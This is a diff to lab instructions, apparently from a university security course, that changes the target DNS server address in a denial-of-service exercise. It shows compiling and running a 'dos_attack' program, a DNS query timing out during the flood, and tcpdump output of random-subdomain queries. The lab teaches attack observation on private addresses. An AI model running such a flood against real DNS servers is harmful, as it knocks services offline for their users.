@@ -24,7 +24,7 @@ Modify the source code to use your DNS server IP address and compile the code:
 
 ```bash
 $ grep dest_sock_addr.sin_addr.s_addr dos_attack.c
-    dest_sock_addr.sin_addr.s_addr = inet_addr("192.168.1.1");  /* target DNS server ip address */
+    dest_sock_addr.sin_addr.s_addr = inet_addr("192.168.100.11");  /* target DNS server ip address */
     ip_header->ip_dst.s_addr = dest_sock_addr.sin_addr.s_addr;
 $ gcc -o dos_attack dos_attack.c
 ```
@@ -34,8 +34,8 @@ Interrogate your DNS server to check if everything works fine (both from the bas
 ```bash
 $ host scgc.ro dns
 Using domain server:
-Name: 192.168.1.1
-Address: 192.168.1.1#53
+Name: 192.168.100.11
+Address: 192.168.100.11#53
 Aliases:
 
 scgc.ro mail is handled by 42 mail.scgc.ro.
@@ -57,10 +57,10 @@ $ sudo ./dos_attack
 While the attack is running, from the base VM, test the DNS server:
 
 ```bash
-$ host scgc.ro 192.168.1.1
+$ host scgc.ro 192.168.100.11
 Using domain server:
-Name: 192.168.1.1
-Address: 192.168.1.1#53
+Name: 192.168.100.11
+Address: 192.168.100.11#53
 Aliases:
 
 ;; connection timed out; no servers could be reached
@@ -71,9 +71,9 @@ Stop the attack and the tcpdump. Inspect the tcpdump output:
 
 ```bash
 ...
-23:26:48.364788 IP 10.0.2.20.29264 > 192.168.1.1.domain: 40664+ A? idcdy.fuawv.lulix. (35)
-23:26:48.364829 IP 10.0.2.20.8518 > 192.168.1.1.domain: 11612+ A? lsrae.olszf.lkttp. (35)
-23:26:48.364870 IP 10.0.2.20.46214 > 192.168.1.1.domain: 28079+ A? ctqzq.bvblt.xltqp. (35)
+23:26:48.364788 IP 10.0.2.20.29264 > 192.168.100.11.domain: 40664+ A? idcdy.fuawv.lulix. (35)
+23:26:48.364829 IP 10.0.2.20.8518 > 192.168.100.11.domain: 11612+ A? lsrae.olszf.lkttp. (35)
+23:26:48.364870 IP 10.0.2.20.46214 > 192.168.100.11.domain: 28079+ A? ctqzq.bvblt.xltqp. (35)
 
 ^C
 760212 packets captured
